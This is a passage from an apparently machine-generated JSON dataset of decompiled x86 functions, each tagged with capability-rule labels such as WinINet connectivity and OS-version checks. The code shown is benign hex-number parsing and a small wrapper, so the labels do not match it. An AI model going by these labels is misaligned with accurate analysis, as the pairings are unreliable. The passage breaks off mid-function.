        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.004064ce(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar2 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    fcn.0040327e(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.004053a8(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0xa8) = piVar6;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x7c);\n    (*pcVar3)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.0040327e(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.0040342c(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x2c);\n    (**0x573000)(\"0123456789ABCDEFabcdef-+XxPp\", 0x54e4dd, unaff_EBP + -0x4c);\n    (*pcVar3)();\n    uVar14 = *(unaff_EBP + -0x84);\n    puVar15 = *(unaff_EBP + -0x9c);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.00401a9b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405c40();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0046f6d2;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.004047a5();\n    }\ncode_r0x0046f6d2:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x98) = puVar15;\n    *(unaff_EBP + -0x90) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.00401a9b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        if (*(iVar2 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.004047a5();\n            cVar4 = fcn.00401a9b(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                iVar10 = *(iVar2 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar2 + 4) == '\\0') {\n                        fcn.00405c40();\n                        iVar10 = *(iVar2 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x0046f75c;\n                }\n                fcn.004047a5();\n            }\n            else {\ncode_r0x0046f75c:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x94) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x94) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.00401a9b(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                uVar7 = fcn.00405588(unaff_EBP + -0x4c, *(iVar2 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x90);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x90) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.004047a5();\n                cVar4 = fcn.00401a9b(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x98) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x88) = 0;\n        }\n        else {\n            uVar7 = fcn.004017d0();\n            *(unaff_EBP + -0x88) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar13 = 0;\n        cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x0046f91b:\n            do {\n                pcVar12 = *(unaff_EBP + -0x94);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x0046f992;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 != *(*(unaff_EBP + -0x88) + iVar13)) goto code_r0x0046f98e;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 < **(unaff_EBP + -0x88)) goto code_r0x0046f98e;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x94) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x94) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405c40();\n            }\n            uVar7 = fcn.00405588(unaff_EBP + -0x4c, *(iVar2 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x90);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x98) = puVar15;\n                    *(unaff_EBP + -0x90) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x88) == 0)) goto code_r0x0046f8fe;\n                iVar10 = *(iVar2 + 6);\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405c40();\n                    iVar10 = *(iVar2 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x88)) goto code_r0x0046f8fe;\n                fcn.00404476(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004047a5();\n            cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x0046f8fe:\n        if (iVar13 == 0) goto code_r0x0046f91b;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 = iVar13 + 1;\n            goto code_r0x0046f91b;\n        }\ncode_r0x0046f98e:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x0046f992:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x94) = iVar8;\n            *(unaff_EBP + -0x88) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.00404070(unaff_EBP + -0x94, unaff_EBP + -0x88);\n                iVar8 = *(unaff_EBP + -0x94);\n            }\n            fcn.00401a32(iVar8);\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x90) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x98) = puVar15;\n    }\n    cVar4 = fcn.00401a9b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar10 = *(iVar2 + 6);\n        iVar5 = fcn.00406104();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.00401366();\n            *puVar15 = **puVar9;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x98) = puVar15;\n            fcn.004047a5();\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if (*(unaff_EBP + -0x90) == 0) {\n        cVar4 = fcn.00401a9b(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.004047a5();\n                cVar4 = fcn.00401a9b(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x98);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while (cVar4 = fcn.00401a9b(uVar14),  cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        uVar7 = fcn.00405588(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x90);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x90) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004047a5();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x0046fce8;\n    cVar4 = fcn.00401a9b(uVar14);\n    if (cVar4 != '\\0') {\ncode_r0x0046fce5:\n        cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x0046fce8:\n        if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n            puVar16 = *(unaff_EBP + -0x9c);\n        }\n        puVar9 = *(unaff_EBP + -0xac);\n        uVar14 = *(unaff_EBP + -0x8c);\n        *puVar16 = 0;\n        *puVar9 = uVar14;\n        fcn.004029b9();\n        fcn.004067d0();\n        return;\n    }\n    if (*(iVar2 + 4) == '\\0') {\n        fcn.00405c40();\n    }\n    iVar10 = *(iVar2 + 6);\n    if (iVar10 != *(unaff_EBP + -0x16)) {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n            iVar10 = *(iVar2 + 6);\n        }\n        if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x0046fce5;\n    }\n    *puVar15 = 0x70;\n    puVar16 = puVar15 + 1;\n    fcn.004047a5();\n    *(unaff_EBP + -0x7d) = 0;\n    iVar13 = 0;\n    cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar16 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405c40();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0046fc40;\n            *puVar16 = 0x2d;\n        }\n        puVar16 = puVar15 + 1;\n        fcn.004047a5();\n    }\ncode_r0x0046fc40:\n    cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        do {\n            cVar1 = *(iVar2 + 4);\n            cVar4 = *(unaff_EBP + -0x7d);\n            *(unaff_EBP + -0x7d) = cVar4;\n            if (cVar1 == '\\0') {\n                fcn.00405c40();\n                cVar4 = *(unaff_EBP + -0x7d);\n            }\n            if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) {\n                if (cVar4 == '\\0') goto code_r0x0046fc97;\n                break;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.004047a5();\n            cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        *puVar16 = 0x30;\n        puVar16 = puVar16 + 1;\n    }\ncode_r0x0046fc97:\n    do {\n        cVar4 = fcn.00401a9b(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') goto code_r0x0046fce5;\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        uVar7 = fcn.00405588(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) goto code_r0x0046fce5;\n        if (iVar13 < 8) {\n            *puVar16 = \"0123456789ABCDEFabcdef-+XxPp\"[uVar7];\n            puVar16 = puVar16 + 1;\n            iVar13 = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004047a5();\n    } while( true );\n}\n",
        "token_count": 5382
    },
    "00406500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406500(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.004048e5(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00401190(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 436
    },
    "00406587": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406587(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 0x24) != 0) {\n        fcn.00405e25(0, *(arg_8h + 0x24));\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0040658c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_15h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid __cdecl fcn.0040658c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    int32_t unaff_EBP;\n    ushort *puVar12;\n    ushort *puVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_15h;\n    uint var_4h;\n    \n    fcn.0040536c(0x88);\n    iVar14 = *(unaff_EBP + 0x18);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0xc);\n    uVar15 = *(iVar14 + 0x30);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = iVar11;\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x1c);\n    fcn.0040327e(uVar15);\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.0040632a(unaff_EBP + -0x7c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x8c) = piVar5;\n    fcn.004050a6();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x60);\n    (*pcVar1)();\n    uVar15 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.0040327e(uVar15);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.004035a8(unaff_EBP + -0x7c);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x573000)(0x54da34, 0x54da51, unaff_EBP + -0x30);\n    (*pcVar1)();\n    uVar15 = *(unaff_EBP + -0x68);\n    puVar12 = *(unaff_EBP + -0x88);\n    *(unaff_EBP + -99) = 0;\n    cVar2 = fcn.00403f7b(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(iVar11 + 5);\n        if (cVar2 == *(unaff_EBP + -0x19)) {\n            *puVar12 = 0x2b;\n        }\n        else {\n            if (*(iVar11 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(iVar11 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x1a)) goto code_r0x00464b83;\n            *puVar12 = 0x2d;\n        }\n        puVar12 = puVar12 + 1;\n        fcn.00401c5d();\n    }\ncode_r0x00464b83:\n    *puVar12 = 0x7830;\n    puVar12 = puVar12 + 1;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x84) = puVar12;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x6c) = 0;\n    cVar2 = fcn.00403f7b(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if (*(iVar11 + 5) == *(unaff_EBP + -0x30)) {\n            fcn.00401c5d();\n            cVar2 = fcn.00403f7b(uVar15);\n            if (cVar2 == '\\0') {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                cVar2 = *(iVar11 + 5);\n                if (cVar2 != *(unaff_EBP + -0x17)) {\n                    if (*(iVar11 + 4) == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(iVar11 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x18)) goto code_r0x00464c01;\n                }\n                fcn.00401c5d();\n            }\n            else {\ncode_r0x00464c01:\n                *(unaff_EBP + -0x61) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0x90) = ((**(unaff_EBP + -0x94) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar10 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x74) = pcVar10;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar10 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x74) = pcVar10;\n    }\n    if ((*pcVar10 == '\\x7f') || (*pcVar10 < '\\x01')) {\n        cVar2 = fcn.00403f7b(uVar15);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar6 = fcn.00402725(unaff_EBP + -0x30, *(iVar11 + 5));\n                if (0x15 < uVar6) break;\n                iVar14 = *(unaff_EBP + -0x70);\n                if (*(unaff_EBP + -0x90) == iVar14 || *(unaff_EBP + -0x90) < iVar14) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar14 != 0)) {\n                    *puVar12 = *(uVar6 + 0x54da34);\n                    puVar12 = puVar12 + 1;\n                    *(unaff_EBP + -0x70) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.00401c5d();\n                cVar2 = fcn.00403f7b(uVar15);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x84) = puVar12;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x62) = 0;\n        }\n        else {\n            uVar3 = fcn.004058b2();\n            *(unaff_EBP + -0x62) = uVar3;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        uVar6 = fcn.00403f7b(*(unaff_EBP + -0x68));\n        if (uVar6 != '\\0') {\n            uVar6 = *(unaff_EBP + -0x34);\n            iVar7 = *(unaff_EBP + -0x48);\ncode_r0x00464d9c:\n            do {\n                pcVar10 = *(unaff_EBP + -0x74);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar2 = *pcVar10,  cVar2 == '\\x7f')) goto code_r0x00464df6;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        *(unaff_EBP + -0x78) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x78) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x80);\n                        if (cVar2 != *(*(unaff_EBP + -0x78) + iVar14)) goto code_r0x00464df2;\n                    }\n                    if (iVar14 == 0) {\n                        *(unaff_EBP + -0x78) = unaff_EBP + -0x48;\n                        if (0xf < uVar6) {\n                            *(unaff_EBP + -0x78) = iVar7;\n                        }\n                        iVar11 = *(unaff_EBP + -0x80);\n                        if (cVar2 < **(unaff_EBP + -0x78)) goto code_r0x00464df2;\n                    }\n                    pcVar10 = *(unaff_EBP + -0x74) + 1;\n                    if (*pcVar10 < '\\x01') break;\n                    *(unaff_EBP + -0x74) = pcVar10;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar11 + 4) == '\\0') {\n                uVar6 = fcn.004019e7();\n            }\n            uVar6 = uVar6 & 0xffffff00 | *(iVar11 + 5);\n            *(unaff_EBP + -0x78) = uVar6;\n            uVar6 = fcn.00402725(unaff_EBP + -0x30, uVar6);\n            if (uVar6 < 0x16) {\n                iVar7 = *(unaff_EBP + -0x70);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x90) == iVar7 || *(unaff_EBP + -0x90) < iVar7) {\n                    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 1;\n                }\n                else if ((uVar6 != 0) || (iVar7 != 0)) {\n                    *puVar12 = *(uVar6 + 0x54da34);\n                    puVar12 = puVar12 + 1;\n                    *(unaff_EBP + -0x84) = puVar12;\n                    *(unaff_EBP + -0x70) = iVar7 + 1;\n                }\n                iVar7 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar7 + iVar14) != '\\x7f') {\n                    iVar7 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar7 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar7 + iVar14) = *(iVar7 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar6 = *(unaff_EBP + -0x34);\n                iVar7 = *(unaff_EBP + -0x48);\n                iVar9 = unaff_EBP + -0x48;\n                if (0xf < uVar6) {\n                    iVar9 = iVar7;\n                }\n                if ((*(iVar9 + iVar14) == '\\0') || (*(unaff_EBP + -0x62) == '\\0')) goto code_r0x00464d7f;\n                if (*(iVar11 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(iVar11 + 5);\n                    uVar6 = *(unaff_EBP + -0x34);\n                    iVar7 = *(unaff_EBP + -0x48);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x78);\n                }\n                if (cVar2 != *(unaff_EBP + -0x62)) goto code_r0x00464d7f;\n                fcn.00404476(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.00401c5d();\n            uVar6 = fcn.00403f7b(*(unaff_EBP + -0x68));\n        } while (uVar6 == '\\0');\n        uVar6 = *(unaff_EBP + -0x34);\n        iVar7 = *(unaff_EBP + -0x48);\ncode_r0x00464d7f:\n        if (iVar14 == 0) goto code_r0x00464d9c;\n        iVar9 = unaff_EBP + -0x48;\n        if (0xf < uVar6) {\n            iVar9 = iVar7;\n        }\n        if ('\\0' < *(iVar9 + iVar14)) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x00464d9c;\n        }\ncode_r0x00464df2:\n        *(unaff_EBP + -99) = 1;\ncode_r0x00464df6:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar6) {\n            *(unaff_EBP + -0x74) = iVar7;\n            *(unaff_EBP + -0x78) = uVar6 + 1;\n            if (0xfff < uVar6 + 1) {\n                fcn.00404070(unaff_EBP + -0x74, unaff_EBP + -0x78);\n                iVar7 = *(unaff_EBP + -0x74);\n            }\n            fcn.00401a32(iVar7);\n        }\n        uVar15 = *(unaff_EBP + -0x68);\n    }\n    if ((*(unaff_EBP + -0x61) != '\\0') && (*(unaff_EBP + -0x70) == 0)) {\n        *puVar12 = 0x30;\n        puVar12 = puVar12 + 1;\n        *(unaff_EBP + -0x84) = puVar12;\n    }\n    cVar2 = fcn.00403f7b(uVar15);\n    if (cVar2 == '\\0') {\n        if (*(iVar11 + 4) == '\\0') {\n            fcn.004019e7();\n        